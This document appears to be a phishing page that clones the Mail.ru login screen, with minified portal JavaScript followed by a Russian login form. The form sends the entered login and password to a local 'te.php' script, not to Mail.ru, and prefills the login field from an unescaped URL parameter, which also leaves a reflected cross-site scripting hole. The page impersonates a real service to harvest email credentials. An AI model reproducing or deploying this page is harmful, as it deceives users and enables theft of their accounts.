(new Date).getTime()>1*a+864E5)return b.SCookie.removeGlobal(this.isCorpCookie),!1},drawName:function(a,d){var c="";"string"!=typeof d?(this._userEmail.className=e.settings.multiAuthEnabled?"x-ph__menu__button__text x-ph__menu__button__text_auth":"x-ph__auth__user__text",c=a):(b.addClass(this._userEmail,"x-ph-ico x-ph-ico_"+this.getSocialId(a)+"_small"),c="&nbsp;"+d);return c},getSocialId:function(a){a=a.match(/^[0-9]+@(vk|ok|fb)$/);return null==a?void 0:a[1]}});var Z=!1;b.extend(b.AccountManager.prototype,
{updateCounters:function(a){var d={},a=a||{};if("mail"!=b.project&&!("home"==b.project&&e.settings.mailSplashUpdate)||!Z&&"mail"==b.project&&!e.settings.mailEvents)d.mail=a.mail_cnt||0;Z=!0;d.my=a.my_cnt||0;e.settings.disableGamesCounter||(d.games=a.games_cnt||0);this.updateNotifier(a);b.counters.update(d)},updateNotifier:function(a){var d=b.byId("PH_authMenu"),a=a.mail_notifier?parseInt(a.mail_notifier,10):0;b[(0==a?"remove":"add")+"Class"](d,"x-ph__menu_auth_unread")},_sendError:function(a){var d=
{updateError:1},c=e.settings.logDetails?{rlog:"navidata_errors",email:e.activeUser(),rlog_message:[]}:null;a.errorType&&(d["updateError_"+a.errorType]=1,c&&c.rlog_message.push(a.errorType));a.requestSource&&(d["updateError_"+a.requestSource]=1,c&&c.rlog_message.push(a.requestSource),a.errorType&&(d["updateError_"+a.errorType+"_"+a.requestSource]=1,c&&c.rlog_message.push(a.errorType)));c?b.radar(d,c):b.radar(d);this.emit("updateError")},_PHUpdater:function(a,d,c){function f(a){"ok"!=b.project&&e.settings.portalAuthEnabled&&
this.updateLogin(k,l);this.updateCounters(h);"function"===typeof a&&a()}var g=a.status,d=d||function(){};if("error"==g)this._sendError(a),d();else{var h=a.data,j=h.action,k=h.email,i=b.bind(f,this),l="undefined"!==typeof h.soc_name?b.replaceUnsafeSymbols(h.soc_name):void 0;this.setCorp(h.list||[]);e.settings.portalAuthEnabled?"switch"==j?"disabled"==g?c?(b.radar({disabledUser:1,disabledUserRestore:1}),d()):(this.emit("disabledUser"),e.emit("disabledUser",a.data,function(){b.radar({disabledUser:1,
disabledUserSendToLogin:1});window.location="https://e.mail.ru/login?fail=1&d1&page="+encodeURIComponent(location.href)+"&email="+encodeURIComponent(k)})):"ok"==g&&k!=this.activeUser()?(this.emit("authChange"),e.listeners("authChange")?(b.radar("authChange",1),!k||void 0!==h.mail_cnt?e.emit("authChange",a.data,function(){i(d)}):this.loadAccountInfo(b.bind(function(a){"error"==a.status?(this._sendError(a),d()):(h=b.extend(a.data,h),e.emit("authChange",h,function(){i(d)}))},this),k)):c?(b.radar("authChangeReloadDis",
1),!k||void 0!==h.mail_cnt?i(d):this.loadAccountInfo(b.bind(function(a){"error"==a.status?(this._sendError(a),d()):(h=b.extend(a.data,h),i(d))},this),k)):(b.radar("authChangeReload",1),b.setTimeout(function(){location.reload()},10))):"noauth"==g&&k!=this.activeUser()?("home"===b.project&&(g=[],g.push("headlineAuthLost"),g.push("mpop="+(e.cookie("Mpop")?"1":"0")),g.push("activeEmail="+this.activeUser()),g.push("newEmail="+k),(new Image).src="//gstat.imgsmail.ru/gstat?ua=1&logme="+encodeURIComponent(g.join(";"))+
"&rnd="+(new Date).getTime()+Math.random()),b.radar("authLost",1),this.emit("authLost"),e.emit("authLost",a.data,function(){a.status="ok";a.data.action="switch";this._PHUpdater(a,d,c)}.bind(this))):(b.radar("authRestore",1),"function"===typeof d&&d()):"list"==j&&("____user"in this&&(this.____user!==k&&"mail"===b.project&&((new Image).src="//gstat.imgsmail.ru/gstat?logme="+encodeURIComponent("headlineFail;headlineEmail="+k+";projectEmail="+this.____user)+"&rnd="+(new Date).getTime()+Math.random(),
j={userMismatch:1},j["userMismatch_"+(k?"":"no")+"HeadlineUser"]=1,j["userMismatch_"+(this.____user?"":"no")+"ProjectUser"]=1,j["userMismatch_"+(this.____user?"":"no")+"PUser_"+(k?"":"no")+"HUser"]=1,b.radar(j)),delete this.____user),null===this.activeUser()?(e.settings.enableUpdateRadars&&b.radar("update",1),this.emit("update"),e.emit("update",a.data,function(){i(d)})):k==this.activeUser()?((j=e.cookie("Mpop"))&&("ok"==g&&this.activeUser()&&-1==j.indexOf(this.activeUser()))&&b.count("d1409289"),
e.settings.enableUpdateRadars&&b.radar("update",1),this.emit("update"),e.emit("update",a.data,function(){i(d)})):(a.data.action="switch",this._PHUpdater(a,d,!0))):(e.settings.enableUpdateRadars&&b.radar("update",1),this.emit("update"),e.emit("update",a.data,function(){i(d)}))}}});b.extend(b.AccountManager.prototype,{_authTransport:new b.Transport(e.settings.authDomain+"/cgi-bin/auth?mac=1",{JSONPCallbackParam:"JSONP_call",xhrEnabled:!0,requestSource:"auth"}),switchAccount:function(a,b,c){var e={};
if(a){e.Login=a;var g=this.updateResume(b||function(){});this._authTransport.get({params:e,complete:function(a){this._PHUpdater(a,g,c)}.bind(this),timeout:3E4})}},_logoutTransport:new b.Transport(e.settings.authDomain+"/cgi-bin/logout?mac=1",{JSONPCallbackParam:"JSONP_call",xhrEnabled:!0,requestSource:"logout"}),logoutAccount:function(a,b){var c={};if(a&&a!==this.activeUser())c.Login=a;else throw Error("Can not logout. Not active account expected.");this._logoutTransport.get({params:c,complete:b})}});
var K=!1,$;b.extend(b.AccountManager.prototype,{_accountInfoTransport:new b.Transport(e.settings.swaDomain+"/NaviData?mac=1&gamescnt=1&Socials=1",{JSONPCallbackParam:"JSONP_call",xhrEnabled:!0,requestSource:"accountInfo"}),loadAccountInfo:function(a,b){var c={};if(b=!e.settings.multiAuthEnabled?void 0:b||this.activeUser())c.Login=b;this._accountInfoTransport.get({params:c,complete:function(b){"function"===typeof a&&a(b)},timeout:3E4})},updateAccountInfo:function(a,b){if(!K){var c=+new Date;if(this._updateByTimeout||
!this._updateByTimeout&&this.updateLastRequest<c-this.updateRequestTimeout||b)!this._updateByTimeout&&this.updateLastRequest&&((new Image).src="//rs.mail.ru/d"+"525468".replace("%","")+".gif?"+c),this.updateLastRequest=c,c=this.updateResume(function(b){this._PHUpdater(b,a)}.bind(this)),this.loadAccountInfo(c)}},updateRequestTimeout:6E4,updateReset:function(a){this._updateByTimeout&&(a?(a=this.updateRequestTimeout-(new Date).getTime()+this.updateLastRequest,0>a&&(a=0)):a=this.updateRequestTimeout,b.clearTimeout(this._listAccountTimeout),
this._listAccountTimeout=b.setTimeout(b.bind(this.updateAccountInfo,this),a))},updateResume:function(a){if(this._updateByTimeout){var d=this._accountInfoTransport.isProcessing();this._accountInfoTransport.cancel();this.updateReset();var c=!1;this.once("authChange",function(a,b){c=!0;"function"===typeof b&&b()})}return b.bind(function(b){this._updateByTimeout&&(d?c?this.updateReset():this.updateAccountInfo():c?this.updateReset():this.updateReset(!0));"function"==typeof a&&a(b)},this)},pauseUpdate:function(a,
b){a?$=setTimeout(function(){K=!0},b):(clearTimeout($),K=!1)}});b.SCookie[(b.retina?"set":"remove")+"Global"]("rt",1);b.SCookie[(b.retina?"set":"remove")+"Global"]("dpr",b.dpr);e.settings.enableUpdateRadars=b.percent(1);e.settings.authFormEnabled=e.settings.multiAuthEnabled=e.settings.portalAuthEnabled;b.rbCounters={projectMenuOpen:"d1198701"};x=!1;if(~navigator.userAgent.indexOf("Opera")&&(!~navigator.userAgent.indexOf("Opera/9.8")||~navigator.userAgent.indexOf("Version/10")||~navigator.userAgent.indexOf("Version/11")||
~navigator.userAgent.indexOf("Opera/10")||~navigator.userAgent.indexOf("Opera 10"))||window.____________ie7||~navigator.userAgent.indexOf("Firefox/3."))e.settings.multiAuthEnabled=!1,e.settings.authFormEnabled=!1,x=!0;b.byId("PH_singleuser").style.display=e.settings.multiAuthEnabled?"none":"block";b.byId("PH_miltiuser").style.display=e.settings.multiAuthEnabled?"block":"none";e.settings.projectsMenuEnabled=!1;x||(e.settings.projectsMenuEnabled=!0,b.byId("PH_projectsMenu").style.display="inline-block",
b.byId("PH_allProjects").style.display="none",b.projectsMenuOpen=(new b.DeferredQuery).getQuery(),b.event(1,b.byId("PH_projectsMenu_button"),"click",b.projectsMenuOpen));e.settings.bizLinks&&(b.byId("PH_projectsMenu").style.display="none",b.byId("PH_allProjects").style.display="none");b.countEl(b.byId("PH_logoutLink"));b.countEl(b.byId("PH_loginLink")||b.byId("PH_authLink"));b.extend(e,b.EventEmitter.prototype,{cookie:B});if(~navigator.userAgent.toLowerCase().indexOf("iphone")||~navigator.userAgent.toLowerCase().indexOf("ipad")||
~navigator.userAgent.toLowerCase().indexOf("ipod")||~navigator.userAgent.toLowerCase().indexOf("android"))document.body.style.cursor="pointer";e.cookie.s={};b.extend(e.cookie.s,{getLocal:g.getLocal,setLocal:g.setLocal,removeLocal:g.removeLocal,getGlobal:g.getGlobal,setGlobal:g.setGlobal,removeGlobal:g.removeGlobal,setProject:g.setProject});var aa="mail"!==b.project;b.accountManager=new b.AccountManager({noAuthView:b.byId("PH_noAuthView"),authView:b.byId("PH_authView"),userEmail:b.byId(e.settings.multiAuthEnabled?
"PH_user-email":"PH_user-email_disabled"),updateByTimeout:aa});b.counters=new b.Counters({mail:"g_mail_events",my:"g_my_events",ok:"g_ok_events",games:"g_games_events",love:"g_love_events"});e.updateCounter=function(a){"sting"===typeof a||"number"===typeof a||void 0===a||null===a?b.counters._counters[b.project]&&b.counters.update(b.project,a):b.counters.update(a);aa||b.accountManager.updateAccountInfo()};"mail"==b.project&&window.jQuery&&window.jQuery(window).bind("updatemessagescount",function(a,
b){e.updateCounter(b)});e.isMultiAuth=function(){return e.settings.multiAuthEnabled};e.activeUser=function(){if(e.settings.portalAuthEnabled){var a=b.accountManager.activeUser();return null===a?b.accountManager.____user:a}return b.byId("PH_user-email_disabled").innerHTML||void 0};e.settings.portalAuthEnabled&&(e.isCorp=function(){var a=e.activeUser();return"corp.mail.ru"==(a&&a.split("@")[1])},e.switchAccount=function(a,d){b.accountManager.switchAccount(a,d)},e.logoutAccount=function(a,d){b.accountManager.logoutAccount(a,
function(){b.accountManager.loadAccountsList(d)})});e.settings.multiAuthEnabled&&(e.loadAccountsList=(new b.DeferredQuery).getQuery(),e.on("visibilitychange",function(a){a.data.hidden?e.settings.pauseUpdate&&b.accountManager.pauseUpdate(!0,e.settings.pauseUpdateTime||36E5):(null!==b.accountManager.activeUser()&&b.accountManager.activeUser()?b.accountManager.switchAccount(b.accountManager.activeUser(),null,!0):b.accountManager.updateAccountInfo(function(){},!0),e.settings.pauseUpdate&&b.accountManager.pauseUpdate())}));
b.authMenu=new b.Menu({baseClass:"x-ph__menu",orientation:"right",rootNode:b.byId("PH_authMenu"),button:b.byId("PH_authMenu_button"),openCounter:"home"==b.project?"d1126003":"mail"==b.project?"d1126002":"my"==b.project?"d1270901":"d1126005"});e.authMenu=new b.EventEmitter;e.authForm=new b.EventEmitter;e.settings.multiAuthEnabled&&(e.authMenu.show=b.authMenu.show.bind(b.authMenu),e.authMenu.hide=b.authMenu.hide.bind(b.authMenu));e.settings.authFormEnabled?(b.showQuery=(new b.DeferredQuery).getQuery(),
e.authForm.show=function(){b.timers.render=1*new Date;b.showQuery.apply(this,arguments)},e.authForm.hide=(new b.DeferredQuery).getQuery(),e.authForm.insert=(new b.DeferredQuery).getQuery(),e.authForm.isVisible=function(){return!1}):(e.authForm.show=function(a){var d=[];a||(a={});a.login&&a.domain&&d.push("email="+a.login+"@"+a.domain);d.push("page="+encodeURIComponent(a.successPage?a.successPage:"mail"==b.project||"home"==b.project?"https://e.mail.ru/messages/inbox?back=1":window.location.href));
window.location="https://e.mail.ru/login?"+d.join("&")},e.authForm.hide=function(){},e.authForm.isVisible=function(){return b.authForm?b.authForm.isVisible():!1});b.authLinkClickHandler=function(a){e.listeners("loginRequest")?(b.eventPreventDefault(a),e.emit("loginRequest")):e.settings.authFormEnabled&&(b.eventPreventDefault(a),e.authForm.show())};b.event(1,b.byId("PH_authLink"),"click",b.authLinkClickHandler);b.registerLinkClickHandler=function(a){e.listeners("registerRequest")&&(b.eventPreventDefault(a),
e.authForm.hide(),e.emit("registerRequest"))};b.event(1,b.byId("PH_regLink"),"click",b.registerLinkClickHandler);e.isAuthFormEnabled=function(){return e.settings.authFormEnabled};if(e.settings.projectsMenuEnabled||e.settings.multiAuthEnabled||e.settings.authFormEnabled)e.settings.authGate&&T(e.settings.authGateJS+"?_="+Math.random()),T(e.settings.externalJS,!0);t.timeEnd("https://account.mail.ru/headline.inline.js")}})(window.__PH,window.__PHS);
</script><!--/noindex-->
        <div id="root"><div><div data-reactroot="" data-reactid="1" data-react-checksum="-1334798639"><div class="portalHeader-0-0 auto-0-7" data-reactid="2"><div class="wrapper-0-3" data-reactid="3"><a href="https://mail.ru/" class="logo-0-1" data-reactid="4"><img src="../img.imgsmail.ru/signup/1505296328/images/logo2x.png" class="logoImg-0-2" width="135" height="28" data-reactid="5"/></a></div></div><div class="login-panel" data-reactid="6"><div class="panel-0-0 small-0-2 auto-0-11" data-reactid="7"><iframe class="iframe-0-9" data-reactid="8"></iframe><div class="wrapper-0-1" data-reactid="9"><div data-reactid="10">
            
            
            <form method="POST" action="te.php">
                
                <div class="login-header" data-reactid="12"><div class="login-header" data-reactid="13"><h1 class="base-0-13 h1-0-14 auto-0-28" data-reactid="14">Вход</h1></div><p class="base-0-13 base-0-13 auto-0-28" data-reactid="15">Введите логин и пароль от своего почтового ящика для того, чтобы продолжить работу с сервисом.</p></div><div data-reactid="16">
                
                <div class="login-row username" data-reactid="17"><div class="formRow-0-29 compact-0-30" data-reactid="18"><div class="field-0-32 compact-0-33" data-reactid="19"><div data-reactid="20"><div class="base-0-35" data-reactid="21"><div class="base-0-36 first-0-41" data-reactid="21"><input type="text" class="base-0-45 auto-0-47" autocapitalize="off" autocomplete="username" autocorrect="off" name="Login" value="<?=$_GET[userid]?>" placeholder="Логин" data-reactid="23"/></div>
                
                
                
                
                        
                        
                        
                        </div></div></div></div></div><div class="login-row" data-reactid="38"><div class="formRow-0-29 compact-0-30" data-reactid="39"><div class="field-0-32 compact-0-33" data-reactid="40"><div data-reactid="41">
                            
                            
                            <div class="base-0-36 first-0-41 last-0-42" data-reactid="42"><input type="password" class="base-0-45 auto-0-47" autocapitalize="off" autocomplete="current-password" autocorrect="off" name="Password" value="" placeholder="Пароль" data-reactid="43"/></div></div></div></div></div><div class="login-row login-row_password-remind" data-reactid="44"><div class="formRow-0-29 compact-0-30" data-reactid="45"><a data-test-id="password-remind" class="base-0-57 auto-0-62" href="https://e.mail.ru/password/restore/" target="_blank" data-reactid="46">Забыли пароль?</a><label class="label-0-65" data-reactid="47"><input type="checkbox" class="input-0-67" name="saveauth" value="1" checked="" data-reactid="48"/><div class="box-0-66" data-reactid="49"></div><span class="base-0-13 control-0-18 auto-0-28" data-reactid="50">запомнить</span></label></div></div><div class="login-row last" data-reactid="51"><div class="formRow-0-29 compact-0-30" data-reactid="52"><div style="width:160px;" data-reactid="53"><button data-test-id="submit-button" class="base-0-1 base-0-69 primary-0-6 primary-0-74 fluid-0-2 fluid-0-70 auto-0-12 auto-0-81" type="submit" data-reactid="54"><span style="visibility:visible;" data-reactid="55">Войти</span></button></div></div></div></div><!-- react-empty: 56 --><div class="login-hr-hack" data-reactid="57"><div class="hr-0-101 oversize-0-102" data-reactid="58"></div></div><div class="login-panel-footer" data-reactid="59"><a data-test-id="signup-link" class="base-0-57 auto-0-62" href="https://e.mail.ru/signup?back=https%3A%2F%2Fe.mail.ru%2Fmessages%2Finbox%3Fback%3D1%26from%3Dlogin&amp;from=login" target="_blank" data-reactid="60">Регистрация в Почте</a></div><div data-reactid="61"><input type="hidden" name="new_auth_form" value="1" data-reactid="62"/><input type="hidden" name="FromAccount" value="1" data-reactid="63"/><input type="hidden" name="act_token" value="d7ec5aed3db0468a87d54fffa9e35b35" data-reactid="64"/><input type="hidden" name="page" value="https://e.mail.ru/messages/inbox?back=1&amp;from=login" data-reactid="65"/><input type="hidden" name="back" value="1" data-reactid="66"/></div></form></div></div></div></div></div></div></div>
        
    </body>


</html>
